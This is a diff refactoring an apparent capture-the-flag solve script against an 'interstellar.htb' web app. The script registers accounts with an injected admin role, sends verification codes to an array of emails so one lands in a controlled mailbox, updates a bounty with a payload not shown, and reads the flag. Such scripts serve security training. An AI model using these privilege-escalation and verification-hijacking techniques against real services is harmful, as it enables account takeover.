@@ -12,11 +12,8 @@ class API:
         self.c = httpx.Client()
         self.verifCode = None
 
-    def sendVerifCode(self,):
-        data = {"email":["kutikula@interstellar.htb","test@email.htb"]}
-        return self.c.post(f"{self.base_url}/api/sendEmail", json=data).json()
-    def sendVerifCode2(self,):
-        data = {"email":["mariaban@interstellar.htb","test@email.htb"]}
+    def sendVerifCode(self, email):
+        data = {"email":[email,"test@email.htb"]}
         return self.c.post(f"{self.base_url}/api/sendEmail", json=data).json()
 
     def submitVerifCode(self):
@@ -24,11 +21,8 @@ class API:
         self.c.post(f"{self.base_url}/api/verify", json=data).json()
         print("[+] Email Verified")
 
-    def register(self,):
-        resp = self.c.post(f"{self.base_url}/api/register", json={"email": "kutikula@interstellar.htb", "password": "aa", "role": "admin"}).json()
-        print(resp)
-    def register2(self,):
-        resp = self.c.post(f"{self.base_url}/api/register", json={"email": "mariaban@interstellar.htb", "password": "aa", "role": "admin"}).json()
+    def register(self,email):
+        resp = self.c.post(f"{self.base_url}/api/register", json={"email": email, "password": "aa", "role": "admin"}).json()
         print(resp)
 
     def login(self,):
@@ -97,13 +91,13 @@ if __name__ == "__main__":
     mail = Mail()
 
     #login as admin, and 1 other user
-    api.register()
-    api.register2()
+    api.register("kutikula@interstellar.htb")
+    api.register("mariaban@interstellar.htb")
 
 
     #check verify token
     mail.deleteAllVerif()
-    resp = api.sendVerifCode()
+    resp = api.sendVerifCode("kutikula@interstellar.htb")
     if resp.get("status") != 400:
         api.verifCode = mail.getVerifCode()
         if api.verifCode:
@@ -121,8 +115,8 @@ if __name__ == "__main__":
     stat = api.updateBounty(7, payload)
 
     #Retrieve the flag
-    mail.deleteAllVerif()
-    stat = api.sendVerifCode2()
+    # mail.deleteAllVerif()
+    stat = api.sendVerifCode("mariaban@interstellar.htb")
 
     #Read The Flag
     huzzah = mail.getVerifCode()
